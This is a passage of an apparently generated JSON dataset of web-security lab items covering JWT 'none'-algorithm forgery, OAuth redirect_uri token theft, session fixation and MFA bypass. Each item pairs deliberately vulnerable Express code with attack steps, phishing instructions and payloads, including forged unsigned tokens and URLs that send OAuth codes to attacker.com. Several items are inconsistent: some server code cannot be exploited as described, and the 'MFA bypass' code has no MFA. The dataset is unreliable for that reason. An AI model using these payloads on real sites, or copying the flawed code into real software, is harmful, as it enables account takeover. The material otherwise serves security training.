        "Lab scenario": "JWT tampering via 'none' algorithm attack",
      
        "Lab Description": "The application uses JSON Web Tokens (JWT) for authentication, but fails to validate the algorithm in the JWT header. The application accepts tokens signed with 'none' algorithm, allowing attackers to forge arbitrary tokens. To solve: Forge a valid JWT token as admin using 'none' algorithm and access the /admin panel.",
      
        "Difficulty Level": "Hard",
      
        "Solution Steps": [
          "Use Burp Suite or Postman to intercept a JWT after logging in with any user.",
          "Decode the JWT using jwt.io and inspect the header. Note the 'alg' field.",
          "Craft a new JWT manually with header: {\"alg\":\"none\",\"typ\":\"JWT\"} and payload: {\"username\":\"admin\"}. Leave signature blank.",
          "Replace the JWT in the Authorization: Bearer header with the forged token.",
          "Send request to GET /admin and verify access is granted."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'admin', password: 'adminpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid'); } }); app.get('/admin', (req, res) => { const auth = req.headers['authorization']; const token = auth && auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.username === 'admin') { res.send('Admin access granted'); } else { res.status(403).send('Forbidden'); } }); app.listen(4000);",
      
        "payloads": [
          "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
          "Authorization: Bearer <forged_token>",
          "Modified JWT with alg:none"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration exploiting open redirect",
      
        "Lab Description": "The application uses OAuth for third-party login but trusts any redirect URI without validation. This enables attackers to manipulate the redirect_uri parameter to capture tokens. To solve: Abuse the redirect URI to intercept Carlos's access token and use it to access his profile.",
      
        "Difficulty Level": "Hard",
      
        "Solution Steps": [
          "Use OWASP ZAP to inspect the OAuth login request and locate the redirect_uri parameter.",
          "Modify the redirect_uri to point to your controlled server (e.g., https://attacker.com/callback).",
          "Craft a phishing link with the manipulated redirect and send it to Carlos (simulate click).",
          "Capture the token from the redirected GET request to your server.",
          "Use Postman to send GET /profile with Authorization: Bearer <captured_token> to access Carlos's data."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { client_id, redirect_uri } = req.query; if (client_id === 'trusted-client') { res.redirect(`${redirect_uri}?token=carlos-access-token`); } else { res.status(400).send('Invalid client'); } }); app.get('/profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'carlos-access-token') { res.send('Profile: Carlos'); } else { res.status(403).send('Access denied'); } }); app.listen(5000);",
      
        "payloads": [
          "https://target.com/auth?client_id=trusted-client&redirect_uri=https://attacker.com/callback",
          "Authorization: Bearer carlos-access-token",
          "Phishing URL with redirect_uri injection"
        ]
      },
      {
        "Lab scenario": "Session Fixation via Predictable Token Injection in OAuth Flow",
        "Lab Description": "The OAuth implementation in this application mishandles session tokens when delegating login to third-party providers. The session identifier is not regenerated upon successful login. The application accepts a session token from unauthenticated users and continues using it post-authentication. To solve: fixate Carlos's session ID prior to login, then hijack his session after he logs in using the third-party flow.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Start Burp Suite and proxy the OAuth login flow; click 'Log in via OAuth Provider' and intercept the initial /auth request.",
          "Inject a predefined session token by modifying the Set-Cookie header to `sessionid=attackerSession123` before redirection occurs.",
          "Allow the OAuth flow to proceed to completion. Observe that the session identifier persists after login, confirming session fixation.",
          "Send the link to Carlos (assume controlled delivery). Once Carlos logs in using the crafted link, use the fixed session cookie `sessionid=attackerSession123` to hijack the session.",
          "Access /account page while reusing the fixed session token. The lab is solved when Carlos's profile loads."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const session = require('express-session'); const app = express(); app.use(cookieParser()); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); app.get('/auth', (req, res) => { const redirectUri = 'http://localhost:4000/callback'; res.redirect(`https://oauth.example.com/login?redirect_uri=${redirectUri}`); }); app.get('/callback', (req, res) => {   req.session.user = 'carlos'; res.redirect('/account'); }); app.get('/account', (req, res) => { if (req.session.user) { res.send(`Welcome back, ${req.session.user}`); } else { res.status(401).send('Unauthorized'); } }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
        "payloads": [
          "sessionid=attackerSession123",
          "Set-Cookie: sessionid=attackerSession123; Path=/; HttpOnly",
          "OAuth redirect link with fixed session injected"
        ]
      },
      {
        "Lab scenario": "JWT Token Forgery via None Algorithm Exploit",
        "Lab Description": "This application uses JWT tokens to authenticate users but fails to verify the algorithm securely. If the algorithm field is set to 'none', the backend skips signature validation entirely. To solve: forge a JWT token for user 'carlos' by changing the algorithm to 'none' and access his account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Intercept a valid JWT token using Burp Suite or browser dev tools during a login request.",
          "Decode the JWT using jwt.io or similar tool and observe it uses HS256 or RS256.",
          "Modify the header to set \"alg\": \"none\" and change the payload's username to \"carlos\".",
          "Remove the signature section entirely to reflect a valid none-algorithm JWT structure.",
          "Send a GET /account request with the Authorization header set to the forged token and verify Carlos’s profile is accessible."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/account', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); req.user = payload.username; } else { req.user = jwt.verify(token, SECRET).username; } res.send(`Welcome ${req.user}`); } catch (err) { res.status(403).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT None Algorithm Lab running'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "Authorization: Bearer [modified_none_jwt]",
          "{\"alg\":\"none\"}, payload:{\"username\":\"carlos\"}, no signature"
        ]
      },
      {
        "Lab scenario": "MFA Bypass via Password Reset Flow",
        "Lab Description": "This application's MFA enforcement fails during the password reset flow. After a password reset, users are logged in without triggering 2FA enforcement. To solve: trigger a password reset for Carlos, set a new password, then access his account page without MFA challenge.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "In Burp Suite, initiate a password reset using Carlos’s email or username.",
          "Intercept the reset link in your email panel and extract the reset token from the query string.",
          "Use the reset token to set a new password for Carlos via POST /reset-password.",
          "Observe that the application automatically logs in the user without triggering the 2FA process.",
          "Navigate to /account while authenticated to Carlos to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); let users = [{ username: 'carlos', password: 'initial', mfa: true }]; let tokens = {}; app.post('/forgot-password', (req, res) => { const token = 'reset123'; tokens[req.body.username] = token; res.send('Reset link sent'); }); app.get('/reset-password', (req, res) => { const { token, user } = req.query; if (tokens[user] === token) { res.send(`<form method='POST'><input name='newPassword'><input type='hidden' name='username' value='${user}'><button>Submit</button></form>`); } else { res.status(403).send('Invalid token'); } }); app.post('/reset-password', (req, res) => { const { username, newPassword } = req.body; const user = users.find(u => u.username === username); if (user) { user.password = newPassword; res.send(`Welcome ${username}`); } else { res.status(400).send('User not found'); } }); app.listen(4000, () => console.log('MFA Bypass via Reset running'));",
        "payloads": [
          "/reset-password?user=carlos&token=reset123",
          "POST /reset-password {username: 'carlos', newPassword: 'newpass123'}",
          "Navigate to /account after reset (no MFA prompt)"
        ]
      },
      {
        "Lab scenario": "JWT algorithm confusion vulnerability in API-based login",
        "Lab Description": "This lab uses JWTs to manage user sessions via a stateless REST API. The backend fails to enforce strict algorithm verification, allowing attackers to tamper with the token header and payload to bypass authentication. The application verifies tokens but trusts user-supplied algorithm types. To solve: forge a token that grants access to the admin dashboard without knowing the secret key.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Postman or Burp Suite to intercept the token after logging in with a low-privilege user.",
          "Decode the JWT using jwt.io and observe the alg header is set to HS256 and a 'role' claim is present.",
          "Modify the alg field from HS256 to 'none', delete the signature section, and change the role claim to 'admin'.",
          "Replay the forged token in the Authorization header of a GET /admin request.",
          "Confirm access to /admin by checking for the presence of the admin dashboard interface."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = 'supersecretkey'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'admin123') { const token = jwt.sign({ user: 'admin', role: 'admin' }, SECRET, { algorithm: 'HS256' }); return res.json({ token }); } if (username === 'guest' && password === 'guest123') { const token = jwt.sign({ user: 'guest', role: 'user' }, SECRET, { algorithm: 'HS256' }); return res.json({ token }); } res.status(401).send('Invalid login'); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.role === 'admin') { return res.send('Welcome to the admin dashboard'); } res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Lab running at http://localhost:${PORT}`));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.",
          "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ."
        ]
      },
      {
        "Lab scenario": "Session fixation vulnerability in login redirect logic",
        "Lab Description": "This lab uses cookies to manage sessions. Upon login, the session ID is preserved if already present. An attacker can exploit this by sharing a pre-set session cookie with a victim and then logging in with that same session. To solve: fix a session with a victim, then hijack their authenticated session after they log in.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to capture the Set-Cookie header before logging in.",
          "Send a crafted phishing URL to the victim containing the fixed session ID as a cookie.",
          "Wait for the victim to log in using the fixed session.",
          "Reuse the same session ID cookie to access the victim's authenticated resources (e.g., /account).",
          "Verify access to the victim's account page and sensitive data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { alice: 'alice123', bob: 'bob123' }; app.get('/login', (req, res) => { const { username, password } = req.query; const sid = req.cookies.sid || Math.random().toString(36).substring(2); if (users[username] && users[username] === password) { sessions[sid] = username; res.cookie('sid', sid); return res.send(`Welcome ${username}`); } res.send('Login failed'); }); app.get('/account', (req, res) => { const user = sessions[req.cookies.sid]; if (user) { return res.send(`Account page of ${user}`); } res.send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "GET /login?username=alice&password=alice123 with Cookie: sid=abc123",
          "GET /account with Cookie: sid=abc123"
        ]
      },
      {
        "Lab scenario": "OAuth open redirect in callback endpoint",
        "Lab Description": "This lab uses a third-party OAuth provider for user authentication. The callback endpoint is vulnerable to an open redirect allowing an attacker to intercept tokens. To solve: manipulate the redirect_uri to leak the authorization code to an attacker-controlled server and use it to impersonate the victim.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp to inspect the OAuth login flow and capture the authorization URL with a redirect_uri parameter.",
          "Modify redirect_uri to point to https://attacker.com/callback (your server).",
          "Send the malicious login URL to the victim.",
          "Capture the leaked authorization code on your server.",
          "Use Postman to exchange the code for an access token and call the victim's /my-account endpoint."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/oauth/callback', async (req, res) => { const { code, redirect_uri } = req.query; try { const tokenRes = await axios.post('https://oauth.example.com/token', { code }); const userInfo = await axios.get('https://oauth.example.com/userinfo', { headers: { Authorization: `Bearer ${tokenRes.data.access_token}` } }); res.redirect(redirect_uri || '/welcome'); } catch (e) { res.status(500).send('OAuth failure'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Callback Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "https://example.com/oauth/authorize?client_id=abc123&redirect_uri=https://attacker.com/callback&response_type=code",
          "POST https://oauth.example.com/token with code=leaked_code",
          "Authorization: Bearer <stolen_token>"
        ]
      },
      {
        "Lab scenario": "JWT 'alg' field tampering to bypass signature validation",
        "Lab Description": "This lab's authentication system uses JWTs for session management. The server is misconfigured to trust JWTs even when the 'alg' field is set to 'none'. The application does not properly validate the integrity of the JWT. To solve: tamper with the JWT to impersonate the user 'carlos' and access their account page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept the login request and capture the JWT token issued after a successful login.",
          "Send the JWT to jwt.io and decode the payload. Note the structure and the header using HS256 algorithm.",
          "Manually modify the header to {\"alg\": \"none\"} and change the payload's username to 'carlos'. Remove the signature portion of the JWT.",
          "Send the tampered token using Burp Repeater in the Authorization header: Bearer [modified-token]",
          "Observe if you gain access to Carlos’s account page, confirming the bypass."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'supersecret' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username }, 'verysecret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const user = decoded.payload.username; return res.send(`Welcome to ${user}'s account.`); } try { const verified = jwt.verify(token, 'verysecret'); return res.send(`Welcome to ${verified.username}'s account.`); } catch { return res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "Header: {\"alg\": \"none\"}, Payload: {\"username\":\"carlos\"}, Signature: (empty)",
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration via open redirect in redirect_uri",
        "Lab Description": "This lab has a misconfigured OAuth 2.0 implementation that accepts unvalidated redirect_uris. An attacker can manipulate the redirect flow to obtain a valid authorization code for another user. To solve: steal Carlos's token via redirect_uri manipulation and use it to access his account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Postman to initiate an OAuth flow using the lab’s /oauth/authorize endpoint and capture the redirect with code.",
          "Change the redirect_uri parameter to a malicious URL under your control and resend the request. The server does not validate it properly.",
          "Send Carlos a phishing link that initiates the OAuth flow and redirects the response to your listener server.",
          "Capture the authorization code in your listener server logs. Exchange it for an access token using /oauth/token.",
          "Use this token in the Authorization header to access Carlos’s account endpoint."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = 'authcode-carlos'; const redirect = `${redirect_uri}?code=${code}&state=${state}`; res.redirect(redirect); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'authcode-carlos') { res.json({ access_token: 'token-carlos' }); } else { res.status(400).send('Invalid code'); } }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-carlos') return res.send('Carlos Account Data'); return res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "https://vulnerable-app.com/oauth/authorize?client_id=xyz&redirect_uri=https://attacker.com/capture&state=1234",
          "POST /oauth/token {\"code\":\"authcode-carlos\"}",
          "Authorization: Bearer token-carlos"
        ]
      },
      {
        "Lab scenario": "Session fixation through predictable session ID generation",
        "Lab Description": "This lab’s login system accepts user-supplied session IDs, and the session ID generation is weak and predictable. The application reuses the session ID if set before login. To solve: fix a known session ID before Carlos logs in and hijack his session afterward.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Using OWASP ZAP, intercept the request to /login and observe the Set-Cookie response header. Note the session ID format (e.g., sess-XXXX).",
          "Send a request to /login with a crafted Cookie header: sessionid=sess-9999 and credentials of your own account. Confirm that the session ID is reused.",
          "Logout and clear your session. Send Carlos a phishing link that sets the sessionid to sess-9999 via HTTP response injection.",
          "Wait until Carlos logs in using that session. Use Burp to send a GET /account with Cookie: sessionid=sess-9999.",
          "Observe if Carlos’s account data is returned, confirming successful session hijack."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'letmein' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sessionid || `sess-${Math.floor(Math.random() * 10000)}`; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); sessions[sid] = user.username; res.cookie('sessionid', sid); res.send('Logged in'); }); app.get('/account', (req, res) => { const sid = req.cookies.sessionid; const username = sessions[sid]; if (username === 'carlos') return res.send('Welcome Carlos'); res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "Cookie: sessionid=sess-9999 before login",
          "Phishing link using <meta http-equiv='Set-Cookie' content='sessionid=sess-9999'>",
          "GET /account with Cookie: sessionid=sess-9999"
        ]
      },
      {
        "Lab scenario": "Session Fixation via Login Without Session Renewal",
        "Lab Description": "This lab demonstrates a session fixation vulnerability in which the session ID remains unchanged after a successful login. The application does not regenerate the session identifier during authentication. To solve: Fixate a session on the victim and log in as Carlos by reusing the same session ID.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to capture a session cookie issued to you before login.",
          "Send the session cookie to the victim using a reflected XSS or phishing attack (assume phishing succeeded for this lab).",
          "Have the victim log in with their credentials using the pre-fixed session.",
          "Reuse the same session cookie in your browser or Burp to gain authenticated access.",
          "Access /account/carlos to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'secret123', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'letmein' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); req.session.user = username; res.redirect('/account'); }); app.get('/account', (req, res) => { if (!req.session.user) return res.status(401).send('Not logged in'); res.send('Welcome ' + req.session.user); }); app.listen(3000);",
        "payloads": [
          "Pre-login session cookie: sessionid=abc123; reused after victim login",
          "Phished login page link with fixed session",
          "Manual reuse of session: document.cookie='sessionid=abc123'"
        ]
      },
      {
        "Lab scenario": "JWT Signature Forgery via Error Leak in Token Validation",
        "Lab Description": "The backend uses JWTs for session management, but it discloses the secret key via verbose stack traces when given a malformed token. The application fails to suppress internal verification errors. To solve: Forge a JWT as Carlos and access his profile.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Send a malformed JWT using Burp Repeater with an invalid signature and capture the verbose error message.",
          "Extract the hardcoded secret key from the leaked error.",
          "Craft a new JWT using HS256 algorithm and set payload { \"username\": \"carlos\" }.",
          "Sign the JWT using the recovered secret and insert it in the Authorization header.",
          "Send a GET request to /profile with the forged token to verify Carlos’s access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecretkey'; app.get('/profile', (req, res) => { try { const token = req.headers['authorization'].split(' ')[1]; const decoded = jwt.verify(token, secret); if (decoded.username === 'carlos') return res.send('Welcome Carlos'); res.send('Access denied'); } catch (e) { res.status(500).send(e.stack); } }); app.listen(3000);",
        "payloads": [
          "JWT with 'alg':'HS256', payload:{'username':'carlos'}, signed using 'supersecretkey'",
          "Malformed token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..invalidsig",
          "Authorization: Bearer <forged_token>"
        ]
      },
      {
        "Lab scenario": "Open Redirect in OAuth Flow",
        "Lab Description": "This OAuth-based login mechanism fails to properly validate the redirect_uri parameter. The application allows an arbitrary domain to receive tokens. To solve: Manipulate the redirect URI to capture Carlos’s OAuth code, then exchange it for an access token and access his profile.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp to intercept the OAuth login request and modify the redirect_uri to your malicious server endpoint (e.g., https://attacker.net/callback).",
          "Send the link to the victim (Carlos) via phishing to trick him into logging in.",
          "Capture the code parameter received at your server from the victim's login.",
          "Exchange the OAuth code at the /oauth/token endpoint using a valid client_id to obtain an access token.",
          "Use the access token to request /user/profile and confirm Carlos’s identity."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri, client_id, response_type } = req.query; if (response_type !== 'code') return res.status(400).send('Invalid response_type'); const code = 'abc123';  return res.redirect(redirect_uri + '?code=' + code); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'abc123') return res.json({ access_token: 'token_carlos' }); res.status(400).send('Invalid code'); }); app.get('/user/profile', (req, res) => { const auth = req.headers['authorization']; if (auth === 'Bearer token_carlos') return res.send('Carlos Profile'); res.status(401).send('Unauthorized'); }); app.listen(3000);",
        "payloads": [
          "https://vulnerable.site/auth?redirect_uri=https://attacker.net/callback&client_id=trusted&response_type=code",
          "POST /oauth/token { code: abc123 }",
          "Authorization: Bearer token_carlos"
        ]
      },
      {
        "Lab scenario": "Session Fixation in cookie-based login system",
        "Lab Description": "The application uses session tokens to track users post-login but does not regenerate them after successful authentication. This allows attackers to fixate a known session ID. The application accepts a session cookie pre-authentication and reuses it post-login without renewal. To solve: force a victim to authenticate under an attacker-supplied session and hijack their session to access their profile.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to intercept a GET /login request and capture the unauthenticated session cookie (sessionid).",
          "2. Share this sessionid with the victim and craft a phishing link that sets this cookie in the victim's browser using JavaScript or an open redirect.",
          "3. Instruct the victim to log in normally with the fixed session.",
          "4. Wait until the victim has authenticated using the fixated session.",
          "5. Reuse the same sessionid in your browser and access /my-account to gain unauthorized access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'pass123' }]; const sessions = {}; app.use((req, res, next) => { if (!req.cookies.sessionid) { const sid = Math.random().toString(36).substr(2); res.cookie('sessionid', sid); sessions[sid] = { authenticated: false }; } next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; const session = sessions[req.cookies.sessionid]; const user = users.find(u => u.username === username && u.password === password); if (user && session) { session.authenticated = true; session.username = username; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const session = sessions[req.cookies.sessionid]; if (session && session.authenticated) { res.send(`Welcome ${session.username}`); } else { res.status(403).send('Forbidden'); } }); app.listen(4000);",
        "payloads": [
          "document.cookie = 'sessionid=attackerknownvalue; path=/';",
          "https://victim-site.com/login?sessionid=attackerknownvalue",
          "Manually inject cookie in browser: sessionid=attackerknownvalue"
        ]
      },
      {
        "Lab scenario": "JWT tampering using 'none' algorithm",
        "Lab Description": "This application uses JWTs for authentication. However, it incorrectly trusts tokens with the 'alg' header set to 'none' and does not verify the signature. This allows an attacker to forge arbitrary tokens. To solve: craft a JWT granting access to the 'admin' user and access their profile.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Log in to the application using your own credentials and intercept the JWT token using Burp.",
          "2. Decode the JWT using jwt.io or similar tool and note the structure of the header, payload, and signature.",
          "3. Modify the header to use 'alg':'none' and change the payload's 'user':'admin'.",
          "4. Remove the signature entirely and base64url-encode the new token.",
          "5. Replace the original Authorization Bearer token with your forged JWT and access /admin-dashboard to verify the attack worked."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', password: 'secret', role: 'admin' }, { username: 'user', password: 'pass', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Unauthorized'); const token = jwt.sign({ user: username, role: user.role }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin-dashboard', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(403).send('Forbidden'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, 'supersecret'); if (decoded.role === 'admin') { res.send('Welcome admin!'); } else { res.status(403).send('Access denied'); } } catch (err) { res.status(400).send('Invalid token'); } }); app.listen(4000);",
        "payloads": [
          "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
          "Payload: {\"user\":\"admin\",\"role\":\"admin\"}",
          "Token: base64url(header).base64url(payload)."
        ]
      },
      {
        "Lab scenario": "OAuth open redirect in redirect_uri parameter",
        "Lab Description": "This OAuth implementation fails to validate the redirect_uri properly during authorization. Attackers can manipulate the redirect_uri to hijack authorization codes. The application whitelists any subdomain and doesn't enforce exact matching. To solve: intercept a user's OAuth flow and steal the authorization code to log in as them.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Initiate an OAuth login flow and observe the authorization URL, especially the redirect_uri.",
          "2. Register a subdomain like attacker.victim-oauth.com and setup a web server to receive redirected codes.",
          "3. Modify the redirect_uri to point to your malicious subdomain and trick the victim into clicking the link.",
          "4. Capture the authorization code from your server logs once the victim logs in and gets redirected.",
          "5. Exchange the stolen code for an access token and use it to call /user-info or /account with the victim's token."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const code = 'authcode123'; res.redirect(`${redirect_uri}?code=${code}`); }); app.get('/callback', (req, res) => { const { code } = req.query; axios.post('https://oauth-provider/token', { code }).then(response => { res.send('Access granted: ' + response.data.token); }).catch(err => res.status(500).send('Error exchanging code')); }); app.listen(4000);",
        "payloads": [
          "https://auth.victim.com/auth?redirect_uri=https://attacker.victim.com/callback",
          "https://auth.victim.com/auth?redirect_uri=https://attacker.com",
          "Capture: GET /callback?code=xyz123",
          "POST /token { code: 'xyz123' }"
        ]
      },
      {
        "Lab scenario": "Session Fixation in OAuth Authorization Flow",
        "Lab Description": "This lab demonstrates a session fixation vulnerability during OAuth login using the Authorization Code grant type. The application mistakenly trusts the session cookie issued before OAuth verification is complete. The application fails to bind the session cookie to the OAuth authorization code flow. To solve: exploit the session fixation to log in as Carlos by abusing the OAuth login flow.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to intercept the login request and initiate OAuth login using your own account. Note the session cookie set during this step.",
          "Capture the redirection URL after clicking 'Log in with OAuth' and note the OAuth state and session values.",
          "Craft a phishing link containing your own session ID and send it to the victim. Use an HTML-based delivery payload with a fake login prompt.",
          "Once Carlos clicks the link and authorizes via OAuth, your session is upgraded to Carlos's identity due to session fixation.",
          "Verify the session by visiting /my-account with your original session cookie still intact."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'sessionFix', resave: false, saveUninitialized: true })); app.get('/auth/login', (req, res) => { req.session.oauth_initiated = true; res.redirect(`https://authserver.com/oauth?state=${req.session.id}`); }); app.get('/auth/callback', (req, res) => { const user = req.query.user; if (req.session.oauth_initiated) { req.session.user = user; res.redirect('/my-account'); } else { res.status(403).send('OAuth flow not initiated.'); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Welcome ${req.session.user}`); else res.status(401).send('Not authenticated'); }); app.listen(4000);",
        "payloads": [
          "https://target-app.com/auth/login?session=attackerSessionID",
          "Phishing page with <meta http-equiv='refresh'> to redirect to OAuth URL with preset session cookie",
          "https://target-app.com/my-account (with pre-authenticated attacker cookie)"
        ]
      },
      {
        "Lab scenario": "JWT None Algorithm Bypass in GraphQL Authorization Header",
        "Lab Description": "This lab simulates an insecure JWT implementation within a GraphQL API that incorrectly allows tokens using the 'none' algorithm. The backend uses the Authorization Bearer token to authenticate users but skips verification if the algorithm is set to 'none'. To solve: forge a JWT with 'alg: none' and impersonate Carlos to access his profile.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Postman to inspect the GraphQL endpoint at /graphql and issue a query with your valid token.",
          "Decode the JWT using jwt.io or a similar tool and observe the payload and headers.",
          "Manually craft a token with 'alg' set to 'none' and payload set to { \"username\": \"carlos\" } without signing.",
          "Replace the Authorization header with 'Bearer [forged_token]' and resend the GraphQL query to fetch user data.",
          "Verify access by fetching Carlos's profile details or settings using a GraphQL query like { me { username, email } }."
        ],
        "Vulnerability name": "Authentication",
